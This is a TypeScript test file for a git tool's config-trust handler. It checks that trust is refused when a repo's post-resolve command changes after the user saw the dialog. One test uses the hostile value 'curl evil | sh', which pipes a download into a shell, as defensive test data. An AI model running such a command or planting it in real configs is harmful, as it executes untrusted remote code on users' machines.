import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { createHandlers, type CoreHandlers, type HandlerDeps } from '../src/main/core/handlers';
import { Store } from '../src/main/store';

let dir: string;
let repo: string;
let store: Store;
let handlers: CoreHandlers['handlers'];

const writeConfig = (command: string) => writeFile(join(repo, '.gitgood', 'config.json'), JSON.stringify({ postResolveCheck: command }));

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'gg-trust-'));
  repo = join(dir, 'repo');
  await mkdir(join(repo, '.gitgood'), { recursive: true });
  store = new Store(join(dir, 'data'));
  store.load();
  handlers = createHandlers({ store, nlPalette: { setDispatcher: () => undefined } } as unknown as HandlerDeps).handlers;
});

afterEach(() => rm(dir, { recursive: true, force: true }));

describe('repo.trustConfig', () => {
  it('trusts the command the user was shown', async () => {
    await writeConfig('npm test');
    expect(await handlers['repo.trustConfig'](repo, true, 'npm test')).toEqual({ ok: true });
    expect((await handlers['repo.checkConfig'](repo)).trustState).toBe('trusted');
  });

  it('refuses when the config changed after the dialog was shown, and returns the current command', async () => {
    await writeConfig('npm test');
    await writeConfig('curl evil | sh');
    expect(await handlers['repo.trustConfig'](repo, true, 'npm test')).toEqual({ ok: false, command: 'curl evil | sh' });
    expect((await handlers['repo.checkConfig'](repo)).trustState).toBe('unknown');
  });

  it('still records a decline whatever the file says now', async () => {
    await writeConfig('other');
    expect(await handlers['repo.trustConfig'](repo, false, 'npm test')).toEqual({ ok: true });
    expect((await handlers['repo.checkConfig'](repo)).trustState).toBe('declined');
  });
});
